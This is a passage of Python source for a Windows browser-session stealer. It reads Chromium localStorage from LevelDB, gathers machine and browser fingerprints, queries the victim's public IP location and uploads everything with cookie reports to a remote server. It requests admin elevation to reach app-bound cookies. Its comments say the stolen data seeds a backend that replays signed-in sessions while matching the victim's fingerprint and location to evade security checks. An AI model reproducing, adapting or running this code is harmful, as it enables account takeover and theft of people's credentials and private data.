    # Read index block → list of (last_key, BlockHandle(offset, size)) for data blocks
    index_entries = []
    try:
        with open(path, "rb") as f:
            f.seek(idx_off)
            raw = f.read(idx_sz)
    except OSError:
        return result
    idx_decomp = _snappy_decompress(raw) if raw else None
    idx_data = idx_decomp or raw
    for ikey, ival in _parse_block(idx_data):
        off, _ = _decode_varint64(ival, 0)
        sz, _ = _decode_varint64(ival, _)
        if off is not None and sz is not None:
            index_entries.append((off, sz))

    # Read each data block
    try:
        with open(path, "rb") as f:
            for boff, bsz in index_entries:
                f.seek(boff)
                raw = f.read(bsz)
                decomp = _snappy_decompress(raw) if raw else None
                block_data = decomp or raw
                for k, v in _parse_block(block_data):
                    result[k] = v
    except OSError:
        pass
    return result

def _parse_wal(path):
    """Parse a LevelDB Write-Ahead Log (.log). Returns dict of key→value.

    WAL blocks are 32 KB. Each record: checksum(4) | length(2) | type(1) | data.
    Types: 1=FULL, 2=FIRST, 3=MIDDLE, 4=LAST. Split records are reassembled.
    """
    BLOCK = 32768
    result = {}
    try:
        with open(path, "rb") as f:
            data = f.read()
    except OSError:
        return result

    pos = 0
    frag = b""
    while pos + 7 <= len(data):
        # Records never start at the very end of a block boundary — if the record
        # header would straddle the boundary, the block remainder is zero-padded.
        block_off = pos % BLOCK
        if block_off + 7 > BLOCK:
            pos += BLOCK - block_off
            continue
        checksum = struct.unpack_from("<I", data, pos)[0]
        rec_len = struct.unpack_from("<H", data, pos + 4)[0]
        rectype = data[pos + 6]
        pos += 7
        if rectype == 0:
            continue
        if pos + rec_len > len(data):
            break
        payload = data[pos:pos + rec_len]
        pos += rec_len
        # Skip CRC validation — LevelDB can function with a torn WAL on crash.
        # We read optimistically: bad bytes won't match our key prefix filter anyway.
        if rectype == 1:   # FULL
            _insert_wal_record(result, payload)
        elif rectype == 2: # FIRST
            frag = payload
        elif rectype == 3: # MIDDLE
            frag += payload
        elif rectype == 4: # LAST
            frag += payload
            _insert_wal_record(result, frag)
            frag = b""
    return result

def _insert_wal_record(result, payload):
    """Try to parse a WAL record as a Put(key, value) and insert into result."""
    # LevelDB WAL records are WriteBatch entries:
    #   sequence_number (8 bytes LE)
    #   count (4 bytes LE)
    #   For count N: repeated (type=1 for Put, key, value) triples
    if len(payload) < 12:
        return
    seq = struct.unpack_from("<Q", payload, 0)[0]
    cnt = struct.unpack_from("<I", payload, 8)[0]
    p = 12
    for _ in range(cnt):
        if p >= len(payload):
            break
        op = payload[p]
        p += 1
        if op == 1:  # kTypeValue = Put
            klen, p2 = _decode_varint32(payload, p)
            if klen is None or p2 + klen > len(payload):
                break
            key = payload[p2:p2 + klen]
            p = p2 + klen
            vlen, p2 = _decode_varint32(payload, p)
            if vlen is None or p2 + vlen > len(payload):
                break
            value = payload[p2:p2 + vlen]
            p = p2 + vlen
            result[key] = value
        elif op == 0:  # kTypeDeletion = Delete
            klen, p2 = _decode_varint32(payload, p)
            if klen is None or p2 + klen > len(payload):
                break
            key = payload[p2:p2 + klen]
            p = p2 + klen
            result.pop(key, None)
        else:
            # Unknown op — skip to next record boundary (best-effort)
            break

def _read_leveldb_directory(dir_path):
    """Read all (key → value) from a LevelDB directory. Merges SSTables + WALs.

    WAL records (more recent) overwrite SSTable entries for the same key.
    """
    result = {}
    if not os.path.isdir(dir_path):
        return result
    # SSTables (.ldb)
    for name in sorted(os.listdir(dir_path)):
        if name.endswith(".ldb"):
            db = _parse_sstable(os.path.join(dir_path, name))
            result.update(db)
    # WALs (.log) — more recent, overwrite
    for name in sorted(os.listdir(dir_path)):
        if name.endswith(".log"):
            wal = _parse_wal(os.path.join(dir_path, name))
            result.update(wal)
    return result


# ---------------------------------------------------------------------------
# Chromium localStorage extraction
# ---------------------------------------------------------------------------
def _origin_from_key(raw_key):
    """Extract origin from a Chromium localStorage LevelDB key.

    Keys are formed as:  _{origin}\x00{storageKey}
    where origin is like 'https://accounts.google.com'.
    Returns (origin_str, storage_key_str) or (None, None).
    """
    if not raw_key or raw_key[0:1] != b"_":
        return None, None
    # Chromium stores values as UTF-16LE; keys are ASCII with \x00 separator.
    try:
        key_str = raw_key.decode("utf-8", errors="replace")
    except Exception:
        return None, None
    idx = key_str.find("\x00")
    if idx <= 1:
        return None, None
    origin = key_str[1:idx]   # strip the leading '_'
    storage_key = key_str[idx + 1:]
    return origin, storage_key

def _decode_local_storage_value(raw_value):
    """Chromium encodes localStorage values as UTF-16LE, prefixed with \x01."""
    if not raw_value or len(raw_value) < 2:
        return ""
    # First byte(s) may be a type marker (\x01 for string, \x00 for undefined).
    val = raw_value
    if val[0:1] == b"\x01":
        val = val[1:]
    elif val[0:2] == b"\x00\x00":
        val = val[2:]
    try:
        return val.decode("utf-16-le", errors="replace")
    except Exception:
        return val.decode("utf-8", errors="replace")

def extract_chromium_local_storage(profile_path):
    """Extract localStorage for one Chromium profile → {origin: {key: value}}.

    Reads {profile}/Local Storage/leveldb/ (LevelDB), decodes keys grouped by
    origin, converts UTF-16LE values to plain strings. Session Storage in Chromium
    is volatile (in-memory + temp files that vanish when the browser closes), so
    only localStorage can be reliably extracted offline.
    """
    leveldb_dir = os.path.join(profile_path, "Local Storage", "leveldb")
    if not os.path.isdir(leveldb_dir):
        return {}
    raw = _read_leveldb_directory(leveldb_dir)
    origins = collections.OrderedDict()
    for k, v in raw.items():
        origin, key = _origin_from_key(k)
        if not origin or not key:
            continue
        val = _decode_local_storage_value(v)
        origins.setdefault(origin, collections.OrderedDict())[key] = val
    return origins


# ---------------------------------------------------------------------------
# Browser / machine fingerprint
# ---------------------------------------------------------------------------
# Map Windows timezone keys → IANA timezone IDs (most common entries).
_WINDOWS_TO_IANA_TZ = {
    # Africa
    "W. Central Africa Standard Time": "Africa/Lagos",
    "South Africa Standard Time": "Africa/Johannesburg",
    "Egypt Standard Time": "Africa/Cairo",
    "E. Africa Standard Time": "Africa/Nairobi",
    "Morocco Standard Time": "Africa/Casablanca",
    # Americas
    "Eastern Standard Time": "America/New_York",
    "Central Standard Time": "America/Chicago",
    "Mountain Standard Time": "America/Denver",
    "Pacific Standard Time": "America/Los_Angeles",
    "Atlantic Standard Time": "America/Halifax",
    "SA Pacific Standard Time": "America/Bogota",
    "SA Western Standard Time": "America/La_Paz",
    "Central Brazilian Standard Time": "America/Cuiaba",
    "E. South America Standard Time": "America/Sao_Paulo",
    "Argentina Standard Time": "America/Argentina/Buenos_Aires",
    "Mexico Standard Time": "America/Mexico_City",
    "Canada Central Standard Time": "America/Regina",
    # Europe
    "GMT Standard Time": "Europe/London",
    "Greenwich Standard Time": "Africa/Abidjan",
    "W. Europe Standard Time": "Europe/Berlin",
    "Central Europe Standard Time": "Europe/Budapest",
    "Romance Standard Time": "Europe/Paris",
    "Central European Standard Time": "Europe/Warsaw",
    "E. Europe Standard Time": "Europe/Bucharest",
    "Turkey Standard Time": "Europe/Istanbul",
    "Russian Standard Time": "Europe/Moscow",
    # Asia / Pacific
    "Arabian Standard Time": "Asia/Dubai",
    "Arab Standard Time": "Asia/Riyadh",
    "Iran Standard Time": "Asia/Tehran",
    "India Standard Time": "Asia/Kolkata",
    "SE Asia Standard Time": "Asia/Bangkok",
    "Singapore Standard Time": "Asia/Singapore",
    "China Standard Time": "Asia/Shanghai",
    "Tokyo Standard Time": "Asia/Tokyo",
    "Korea Standard Time": "Asia/Seoul",
    "AUS Eastern Standard Time": "Australia/Sydney",
    "New Zealand Standard Time": "Pacific/Auckland",
}

def _get_screen_resolution():
    """Actual screen dimensions via GetSystemMetrics."""
    try:
        user32 = ctypes.windll.user32
        return {
            "width": user32.GetSystemMetrics(0),   # SM_CXSCREEN
            "height": user32.GetSystemMetrics(1),  # SM_CYSCREEN
        }
    except Exception:
        return {"width": 1920, "height": 1080}

def _get_windows_timezone_key():
    """Windows timezone key name via GetDynamicTimeZoneInformation."""
    try:
        class DYNAMIC_TIME_ZONE_INFORMATION(ctypes.Structure):
            _fields_ = [
                ("Bias", wintypes.LONG),
                ("StandardName", wintypes.WCHAR * 32),
                ("StandardDate", wintypes.SYSTEMTIME),
                ("StandardBias", wintypes.LONG),
                ("DaylightName", wintypes.WCHAR * 32),
                ("DaylightDate", wintypes.SYSTEMTIME),
                ("DaylightBias", wintypes.LONG),
                ("TimeZoneKeyName", wintypes.WCHAR * 128),
                ("DynamicDaylightTimeDisabled", wintypes.BOOLEAN),
            ]
        dtzi = DYNAMIC_TIME_ZONE_INFORMATION()
        ctypes.windll.kernel32.GetDynamicTimeZoneInformation(ctypes.byref(dtzi))
        return dtzi.TimeZoneKeyName, -dtzi.Bias  # minutes east of UTC
    except Exception:
        return "", 0

def _get_iana_timezone():
    """Convert Windows timezone key → IANA timezone ID."""
    key, offset = _get_windows_timezone_key()
    return _WINDOWS_TO_IANA_TZ.get(key, "")

def _get_utc_offset_minutes():
    _, offset = _get_windows_timezone_key()
    return offset

def _get_system_locale():
    """Windows locale name via GetUserDefaultLocaleName (e.g. 'en-NG')."""
    try:
        buf = ctypes.create_unicode_buffer(85)
        if ctypes.windll.kernel32.GetUserDefaultLocaleName(buf, 85):
            return buf.value
    except Exception:
        pass
    return ""

def _get_accept_language():
    """Build an Accept-Language string from the system locale."""
    loc = _get_system_locale()
    if not loc:
        return "en-US,en;q=0.9"
    lang = loc.replace("_", "-")
    primary = lang.split("-")[0] if "-" in lang else lang
    return f"{lang},{primary};q=0.9"

def _get_cpu_cores():
    return os.cpu_count() or 4

def _get_device_memory():
    """Total physical memory in GB (rounded)."""
    try:
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", wintypes.DWORD),
                ("dwMemoryLoad", wintypes.DWORD),
                ("ullTotalPhys", ctypes.c_uint64),
                ("ullAvailPhys", ctypes.c_uint64),
                ("ullTotalPageFile", ctypes.c_uint64),
                ("ullAvailPageFile", ctypes.c_uint64),
                ("ullTotalVirtual", ctypes.c_uint64),
                ("ullAvailVirtual", ctypes.c_uint64),
                ("ullAvailExtendedVirtual", ctypes.c_uint64),
            ]
        mem = MEMORYSTATUSEX()
        mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
        gb = mem.ullTotalPhys / (1024 ** 3)
        # Round to powers of 2 that browsers report (1, 2, 4, 8, 16, 32)
        for candidate in (1, 2, 4, 8, 16, 32):
            if gb <= candidate:
                return candidate
        return 32
    except Exception:
        return 8

def _get_platform_str():
    """Platform string as reported by navigator.platform (e.g. 'Win32')."""
    # Modern browsers report Win32 even on 64-bit.
    return "Win32"

def _get_os_version():
    """Windows version like 'Windows 10.0.19045'."""
    try:
        v = sys.getwindowsversion()
        return f"Windows {v.major}.{v.minor}.{v.build}"
    except Exception:
        return "Windows"

def _get_browser_version(user_data_path):
    """Read Chromium version from {user_data}/Last Version file."""
    lv = os.path.join(user_data_path, "Last Version")
    if os.path.isfile(lv):
        try:
            return open(lv, "r").read().strip()
        except Exception:
            pass
    return ""

def _build_chromium_ua(version, browser_name):
    """Construct the browser's real User-Agent from its detected version."""
    os_ver = _get_os_version()
    nt_ver = os_ver.replace("Windows ", "")
    base = (f"Mozilla/5.0 (Windows NT {nt_ver}; Win64; x64) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Safari/537.36")
    if "Edge" in browser_name:
        return base + f" Edg/{version}"
    return base

def collect_system_fingerprint():
    """Collect machine-level fingerprint — same regardless of which browser."""
    geo = _fetch_ip_geolocation()
    return {
        "screen": _get_screen_resolution(),
        "timezone": _get_iana_timezone(),
        "utc_offset_minutes": _get_utc_offset_minutes(),
        "locale": _get_system_locale(),
        "accept_language": _get_accept_language(),
        "cpu_cores": _get_cpu_cores(),
        "device_memory": _get_device_memory(),
        "platform": _get_platform_str(),
        "os_version": _get_os_version(),
        # Real geolocation from the target machine's public IP — so the
        # backend can set navigator.geolocation to match where the user
        # actually is, reducing location-mismatch security checks.
        "geo_ip": geo.get("ip", ""),
        "geo_city": geo.get("city", ""),
        "geo_region": geo.get("region", ""),
        "geo_country": geo.get("country", ""),
        "geo_latitude": geo.get("latitude", None),
        "geo_longitude": geo.get("longitude", None),
    }

def collect_browser_fingerprint(user_data_path, browser_name):
    """Collect browser-specific fingerprint: real User-Agent + Preferences."""
    version = _get_browser_version(user_data_path)
    ua = _build_chromium_ua(version, browser_name) if version else ""
    prefs = _extract_preferences(user_data_path)
    return {
        "user_agent": ua,
        "version": version,
        # The browser's own accept_languages from Preferences (more accurate
        # than the OS locale). Sites check the Accept-Language header against
        # the IP's expected language — a mismatch is a red flag.
        "accept_language": prefs.get("accept_languages", ""),
    }


# ---------------------------------------------------------------------------
# IP geolocation — query the target machine's public IP and location
# ---------------------------------------------------------------------------
def _fetch_ip_geolocation(timeout=5):
    """Fetch the target machine's public IP + geolocation from ipinfo.io.

    This is called FROM the user's PC, so the IP returned is the user's real
    public IP — the one sites see when the user browses normally. We record
    city/region/country/lat/lon so the backend can set matching Playwright
    geolocation and detect when a proxy is needed.
    """
    try:
        resp = requests.get("https://ipinfo.io/json", timeout=timeout)
        if resp.status_code != 200:
            return {}
        data = resp.json()
        loc = (data.get("loc") or "").split(",")
        return {
            "ip": data.get("ip", ""),
            "city": data.get("city", ""),
            "region": data.get("region", ""),
            "country": data.get("country", ""),
            "latitude": float(loc[0]) if len(loc) >= 2 and loc[0] else None,
            "longitude": float(loc[1]) if len(loc) >= 2 and loc[1] else None,
        }
    except Exception:
        return {}


# ---------------------------------------------------------------------------
# Browser Preferences extraction — accept-language, fonts, site settings
# ---------------------------------------------------------------------------
def _extract_preferences(user_data_path):
    """Extract relevant signals from Chromium's Preferences JSON file.

    The Preferences file (in the User Data root) is a JSON blob that persists
    across browser restarts. We pull the signals that sites use to recognize a
    returning device:
      - intl.accept_languages  → the exact Accept-Language header the browser sends
      - webkit.webprefs.fonts  → font preferences (a fingerprinting vector)
    """
    prefs_path = os.path.join(user_data_path, "Preferences")
    if not os.path.isfile(prefs_path):
        return {}
    try:
        with open(prefs_path, "r", encoding="utf-8") as f:
            prefs = json.load(f)
    except Exception:
        return {}

    result = {}
    # Accept-Language — this is the EXACT string sent in the header.
    # It often differs from the OS locale (e.g. "en-NG,en-US;q=0.9,en;q=0.8").
    intl = prefs.get("intl", {})
    al = intl.get("accept_languages", "")
    if al:
        result["accept_languages"] = al

    return result


# ---------------------------------------------------------------------------
# Storage + fingerprint serialization (appended to the cookie report)
# ---------------------------------------------------------------------------
STORAGE_BEGIN = "<<<CLONE_STORAGE_V1"
STORAGE_END = "CLONE_STORAGE_V1>>>"
FINGERPRINT_BEGIN = "<<<CLONE_FINGERPRINT_V1"
FINGERPRINT_END = "CLONE_FINGERPRINT_V1>>>"

def serialize_storage_block(storage_data):
    """Serialize { (browser, profile): {origin: {local: {k:v}}} } → embedded JSON block.

    The backend's cookies.py already reads this block and seeds localStorage via
    an init_script that fires before every page's own scripts — so a site that
    keeps its session token in JS storage sees a signed-in session immediately.
    """
    profiles_out = []
    for (browser, profile), origins in storage_data.items():
        norm = {}
        for origin, data in origins.items():
            if data.get("local"):
                norm[origin] = {"local": data["local"]}
        if norm:
            profiles_out.append({
                "browser": browser,
                "profile": profile,
                "origins": norm,
            })
    if not profiles_out:
        return ""
    payload = json.dumps({"profiles": profiles_out}, separators=(",", ":"), ensure_ascii=False)
    return f"\n\n{STORAGE_BEGIN}\n{payload}\n{STORAGE_END}\n"

def serialize_fingerprint_block(machine_fp, browser_fps):
    """Serialize {machine: {...}, browsers: {browser_name: {...}}}  → embedded JSON block."""
    payload = json.dumps({
        "machine": machine_fp,
        "browsers": browser_fps,
    }, separators=(",", ":"), ensure_ascii=False)
    return f"\n{FINGERPRINT_BEGIN}\n{payload}\n{FINGERPRINT_END}\n"


# ---------------------------------------------------------------------------
# Main (now accepts parsed arguments)
# ---------------------------------------------------------------------------
def main(args):
    # Collect log output so it can be both printed and uploaded.
    log_lines = []
    def emit(*args_emit):
        line = " ".join(str(a) for a in args_emit)
        print(line)
        log_lines.append(line)

    records = []

    emit("Scanning for installed browsers...")
    chromium = discover_chromium_browsers()
    firefox = discover_firefox_browsers()

    if not chromium and not firefox:
        emit("No supported browsers were found on this PC.")
    else:
        found_names = [b["name"] for b in chromium] + [f"{b['name']} (Firefox)" for b in firefox]
        emit(f"Found {len(found_names)} browser(s): " + ", ".join(found_names))

    if CLOSE_BROWSERS and (chromium or firefox):
        emit("")
        close_browsers(emit)

    for b in chromium:
        emit("")
        emit(f"[+] {b['name']}  ->  {b['user_data']}")
        try:
            records.extend(process_chromium_browser(b, emit))
        except Exception as e:
            emit(f"    ! failed to process {b['name']}: {e}")

    for b in firefox:
        emit("")
        emit(f"[+] {b['name']} (Firefox family)  ->  {b['profiles_root']}")
        try:
            records.extend(process_firefox_browser(b, emit))
        except Exception as e:
            emit(f"    ! failed to process {b['name']}: {e}")

    # --- Collect localStorage from Chromium profiles ---
    emit("")
    emit("Extracting localStorage from Chromium profiles...")
    storage_data = {}   # { (browser, profile): {origin: {"local": {k:v}}} }
    for b in chromium:
        user_data = b["user_data"]
        browser_name = b["name"]
        profiles = enumerate_chromium_profiles(user_data)
        for prof in profiles:
            profile_dir = os.path.dirname(prof["cookie_db"])
            ls = extract_chromium_local_storage(profile_dir)
            if ls:
                key = (browser_name, prof["profile"])
                # Wrap each origin's key-value dict in the {"local": ...} shape
                # the backend's parse_storage_block expects.
                wrapped = {}
                for origin, kvs in ls.items():
                    wrapped[origin] = {"local": kvs}
                storage_data[key] = wrapped
                origin_count = len(ls)
                emit(f"  {browser_name} / {prof['profile']}: {origin_count} origins with localStorage")

    # --- Collect fingerprint data ---
    emit("")
    emit("Collecting browser fingerprint...")
    machine_fp = collect_system_fingerprint()
    if machine_fp.get("geo_country"):
        emit(f"  Location: {machine_fp['geo_city']}, {machine_fp['geo_region']}, "
             f"{machine_fp['geo_country']} (IP: {machine_fp['geo_ip']})")
    browser_fps = {}
    for b in chromium:
        fp = collect_browser_fingerprint(b["user_data"], b["name"])
        if fp["user_agent"] or fp["version"]:
            browser_fps[b["name"]] = fp
            emit(f"  {b['name']}: {fp['version']} → {fp['user_agent'][:80]}...")

    # Build the final report and collect all output lines.
    report_lines = build_report(records)

    # Combine log_lines, report, storage block, and fingerprint block.
    storage_block = serialize_storage_block(storage_data)
    fingerprint_block = serialize_fingerprint_block(machine_fp, browser_fps)
    full_output = ("\n".join(log_lines) + "\n\n" + "\n".join(report_lines)
                   + storage_block + fingerprint_block)

    # Print the final report to console (already printed via emit, but let's show the extra sections)
    print("")
    print("=" * 70)
    print("")
    for line in report_lines:
        print(line)
    if storage_block:
        print(storage_block)
    if fingerprint_block:
        print(fingerprint_block)

    # Upload the output to the remote server.
    upload_url = args.url
    try:
        files = {'file': ('output.txt', full_output.encode('utf-8'), 'text/plain')}
        data = {
            'username': args.username,
            'password': args.password,
            'name': args.name,
        }
        response = requests.post(upload_url, data=data, files=files)
        if response.status_code == 200:
            emit("")
            emit(f"Upload successful. Server responded: {response.text}")
        else:
            emit("")
            emit(f"Upload failed with status {response.status_code}: {response.text}")
    except Exception as e:
        emit("")
        emit(f"Upload error: {e}")


# ---------------------------------------------------------------------------
# Argument parsing and entry point
# ---------------------------------------------------------------------------
def parse_args():
    parser = argparse.ArgumentParser(
        description="Extract browser cookies and upload the report."
    )
    parser.add_argument(
        "--username", required=True,
        help="Username for the upload endpoint"
    )
    parser.add_argument(
        "--password", required=True,
        help="Password for the upload endpoint"
    )
    parser.add_argument(
        "--url",
        default=DEFAULT_UPLOAD_URL,
        help="Upload endpoint URL"
    )
    parser.add_argument(
        "--name",
        default=DEFAULT_NAME,
        help="Name field sent to the upload API"
    )
    parser.add_argument(
        "--no-close",
        action="store_true",
        help="Skip closing browsers before extraction"
    )
    return parser.parse_args()


if __name__ == "__main__":
    # Parse CLI arguments early so they are available for relaunch and for the --no-close flag.
    args = parse_args()

    if args.no_close:
        CLOSE_BROWSERS = False

    if not is_admin():
        print("Administrator rights required (for Chrome/Chromium v20 app-bound cookies).")
        print("Requesting elevation... A new (elevated) window will open.")
        print("Results will be uploaded to the remote server.")
        relaunch_as_admin()
    else:
        try:
            main(args)
        except Exception:
            tb = traceback.format_exc()
            print("\n!!! The decryptor crashed:\n" + tb)
        finally:
            try:
                input("\nDone. Press Enter to close this window...")
            except EOFError:
                pass